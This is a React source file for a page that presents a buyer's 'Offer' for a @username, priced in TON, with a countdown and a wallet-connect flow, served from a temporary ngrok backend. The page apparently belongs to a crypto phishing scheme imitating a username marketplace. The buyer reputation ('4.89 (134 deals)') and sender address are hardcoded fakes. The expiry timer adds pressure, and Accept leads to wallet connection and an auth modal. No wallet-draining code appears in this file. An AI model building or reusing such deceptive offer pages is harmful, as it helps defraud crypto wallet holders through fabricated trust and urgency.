import React, { useState, useEffect, useCallback } from 'react';
import Countdown from "react-countdown";
import CountdownTimer from "./components/CountdownTimer.jsx";
import WalletModal from "./components/WalletModal.jsx";
import AuthModal from "./components/AuthModal.jsx";
import { useParams } from 'react-router-dom';
import Binance from 'binance-api-node'; // Импортируем библиотеку для работы с Binance API

const App = () => {
    const { orderId } = useParams();
    const [order, setOrder] = useState(null);
    const [loading, setLoading] = useState(true);
    const [error, setError] = useState(null);
    const [timeLeft, setTimeLeft] = useState(0);
    const [showWalletModal, setShowWalletModal] = useState(false);
    const [selectedWallet, setSelectedWallet] = useState(null);
    const [showSuccessModal, setShowSuccessModal] = useState(false);
    const [tonPriceInUSD, setTonPriceInUSD] = useState(null); // Состояние для хранения курса TON/USD
    const [usdEquivalent, setUsdEquivalent] = useState(null); // Состояние для хранения эквивалента в USD
    // Инициализация клиента Binance API
    const binanceClient = Binance();

    // Функция для получения курса TON/USDT
    const fetchTonPrice = async () => {
        try {
            const ticker = await binanceClient.prices({ symbol: 'TONUSDT' }); // Получаем курс TON/USDT
            setTonPriceInUSD(parseFloat(ticker.TONUSDT)); // Обновляем состояние с курсом
        } catch (err) {
            console.error('Failed to fetch TON price:', err);
        }
    };

    // Функция для расчета эквивалента в USD
    const calculateUsdEquivalent = useCallback(() => {
        if (order && tonPriceInUSD) {
            const equivalent = order.price * tonPriceInUSD; // Рассчитываем эквивалент
            setUsdEquivalent(equivalent.toFixed(2)); // Обновляем состояние с эквивалентом
        }
    }, [order, tonPriceInUSD]);

    // Загружаем данные заказа
    useEffect(() => {
        console.log(orderId)
        const fetchOrder = async () => {
            const BASE_URL = `https://b1b0-31-134-118-93.ngrok-free.app`;
            try {
                const response = await fetch(`${BASE_URL}/api/v1/orders/${orderId}`);
                if (!response.ok) {
                    throw new Error('Order not found');
                }
                const data = await response.json();
                setOrder(data);

                const expiryDate = new Date(data.expiryAt);
                const now = new Date();
                const diffInSeconds = Math.floor((expiryDate - now) / 1000);
                setTimeLeft(diffInSeconds > 0 ? diffInSeconds : 0);
            } catch (err) {
                setError(err.message);
            } finally {
                setLoading(false);
            }
        };

        fetchOrder();
    }, [orderId]);

    // Получаем курс TON/USDT при монтировании компонента и каждые 10 секунд
    useEffect(() => {
        fetchTonPrice(); // Первоначальный запрос
        const interval = setInterval(fetchTonPrice, 10000); // Обновляем каждые 10 секунд
        return () => clearInterval(interval); // Очищаем интервал при размонтировании
    }, []);

    // Пересчитываем эквивалент в USD при изменении курса или заказа
    useEffect(() => {
        calculateUsdEquivalent();
    }, [calculateUsdEquivalent]);

    const updateTimer = useCallback(() => {
        setTimeLeft(prev => prev > 0 ? prev - 1 : 0);
    }, []);

    useEffect(() => {
        const timerID = setInterval(updateTimer, 1000);
        return () => clearInterval(timerID);
    }, [updateTimer]);

    const handleAccept = useCallback(() => {
        setShowWalletModal(true);
    }, []);

    const handleSelectWallet = useCallback((wallet) => {
        setSelectedWallet(wallet);
        setShowWalletModal(false);
        console.log(`selected wallet : ${wallet}`);
    }, []);

    if (loading) {
        return (
            <div style={styles.loadingContainer}>
                <div style={styles.spinner}></div>
                <p style={styles.loadingText}>Loading order details...</p>
            </div>
        );
    }

    if (error) {
        return <div style={styles.error}>Error: {error}</div>;
    }

    return (
        <div className="centner d-flex h-100 justify-content-center align-items-center">
            {showSuccessModal && (
                <AuthModal
                    walletName={selectedWallet}
                    onClose={() => setShowSuccessModal(false)}
                />
            )}
            <WalletModal
                isOpen={showWalletModal}
                onClose={() => setShowWalletModal(false)}
                onSuccess={() => setShowSuccessModal(true)}
                onSelectWallet={handleSelectWallet}
            />
            <div style={styles.container} className={'myContainer rounded-4'}>
                <div className="header px-3 py-3">
                    <img src="/icon.svg" alt="" />
                </div>

                <div style={styles.card}>
                    <div className="card-header text-center">
                        <div className="card-header-label fs-3 fw-bold main-color">Offer</div>
                        <div className="card-header-info secondary-color">from @{order.buyerUsername}</div>
                    </div>

                    <div style={styles.divider}></div>

                    <div style={styles.row}>
                        <span style={styles.label}>Username</span>
                        <span style={styles.username}>@{order.username}</span>
                    </div>

                    <div style={styles.row}>
                        <span style={styles.label}>Price</span>
                        <div className="prices">
                            <div className="ton-price">
                                <div className={'d-inline-flex'}>
                                    <div style={styles.price}>{order.price.toFixed(2)}</div>
                                    <div className={'ms-1 d-flex'}>
                                        <img src="/tonIcon.svg" alt="" />
                                    </div>
                                </div>
                            </div>
                            <div className={'usd-price secondary-color text-center'}>
                                ~ ${usdEquivalent || 'Loading...'} {/* Отображаем эквивалент в USD */}
                            </div>
                        </div>
                    </div>
                    <div style={styles.divider}></div>

                    <div style={styles.row}>
                        <span style={styles.label}>From</span>
                        <a href={''} style={styles.address}>EQBBm4...EWaknx</a>
                    </div>

                    <div style={styles.row}>
                        <span style={styles.label}>Buyer reputation</span>
                        <span style={styles.reputation}>4.89 (134 deals)</span>
                    </div>

                    <div style={styles.divider}></div>
                    <div style={styles.row}>
                        <span style={styles.label}>Created at</span>
                        <span style={styles.reputation}>{new Date(order.createdAt).toLocaleString()}</span>
                    </div>
                    <div style={styles.timerSection}
                         className={'w-100 d-inline-flex justify-content-between align-items-center'}>
                        <span style={styles.label}>Ends in</span>
                        <CountdownTimer seconds={timeLeft} />
                    </div>
                    <div style={styles.divider}></div>

                    <div style={styles.buttons}>
                        <button
                            style={styles.acceptButton}
                            onClick={handleAccept}
                        >Accept
                        </button>
                        <button style={styles.declineButton}>Decline</button>
                    </div>
                </div>
                <div className="footer px-3 py-3 text-center">
                    <p className={'secondary-color fs-6 m-0 p-0'}>{order.uuid}</p>
                </div>
            </div>
        </div>
    );
};
const styles = {
    container: {
        backgroundColor: '#1a2026',
        fontFamily: '-apple-system, BlinkMacSystemFont, sans-serif',
    },
    card: {
        backgroundColor: '#212a33',
        margin: '0 auto',
        padding: '24px',
    },
    section: {
        marginBottom: '16px',
    },
    row: {
        display: 'flex',
        justifyContent: 'space-between',
        alignItems: 'center',
        margin: '12px 0',
    },
    label: {
        color: '#888',
        fontSize: '14px',
        fontWeight: '400',
    },
    value: {
        color: '#fff',
        fontSize: '14px',
        fontWeight: '500',
    },
    username: {
        color: '#00b2ff',
        fontSize: '16px',
        fontWeight: '600',
    },
    price: {
        color: '#fff',
        fontSize: '16px',
        fontWeight: '600',
    },
    address: {
        color: '#00b2ff',
        fontSize: '14px',
        fontFamily: 'monospace',
    },
    reputation: {
        color: '#fff',
        fontSize: '14px',
        fontWeight: '500',
    },
    divider: {
        height: '1px',
        backgroundColor: '#333',
        margin: '16px 0',
    },
    timerSection: {
        textAlign: 'center',
    },
    timer: {
        color: '#fff',
        fontSize: '28px',
        fontWeight: '600',
        letterSpacing: '1px',
        marginTop: '8px',
    },
    buttons: {
        display: 'flex',
        gap: '12px',
        marginTop: '24px',
    },
    acceptButton: {
        flex: 1,
        backgroundColor: '#00b2ff',
        color: '#fff',
        border: 'none',
        borderRadius: '8px',
        padding: '14px',
        fontSize: '16px',
        fontWeight: '600',
        cursor: 'pointer',
    },
    declineButton: {
        flex: 1,
        backgroundColor: '#333',
        color: '#fff',
        border: 'none',
        borderRadius: '8px',
        padding: '14px',
        fontSize: '16px',
        fontWeight: '600',
        cursor: 'pointer',
    },
    modalOverlay: {
        position: 'fixed',
        top: 0,
        left: 0,
        right: 0,
        bottom: 0,
        backgroundColor: 'rgba(0,0,0,0.7)',
        display: 'flex',
        justifyContent: 'center',
        alignItems: 'center',
        zIndex: 1000,
    },
    modalContent: {
        backgroundColor: '#1a2026',
        borderRadius: '16px',
        padding: '2rem',
        width: '320px',
        textAlign: 'center',
    },
    modalTitle: {
        color: '#00b2ff',
        marginBottom: '1.5rem',
        fontSize: '1.2rem',
    },
    walletButton: {
        backgroundColor: '#212a33',
        color: '#fff',
        border: 'none',
        borderRadius: '12px',
        padding: '1rem',
        width: '100%',
        margin: '0.5rem 0',
        display: 'flex',
        alignItems: 'center',
        justifyContent: 'center',
        gap: '1rem',
        cursor: 'pointer',
        transition: 'background-color 0.3s',
        ':hover': {
            backgroundColor: '#293440',
        }
    },
    walletIcon: {
        width: '24px',
        height: '24px',
    },
    loadingContainer: {
        display: 'flex',
        flexDirection: 'column',
        alignItems: 'center',
        justifyContent: 'center',
        height: '100vh',
    },
    spinner: {
        width: '40px',
        height: '40px',
        border: '4px solid #00b2ff',
        borderTopColor: 'transparent',
        borderRadius: '50%',
        animation: 'spin 1s linear infinite',
    },
    loadingText: {
        color: '#00b2ff',
        marginTop: '16px',
        fontSize: '16px',
    },
    error: {
        color: '#ff4d4d',
        textAlign: 'center',
        padding: '20px',
    },
};

export default App;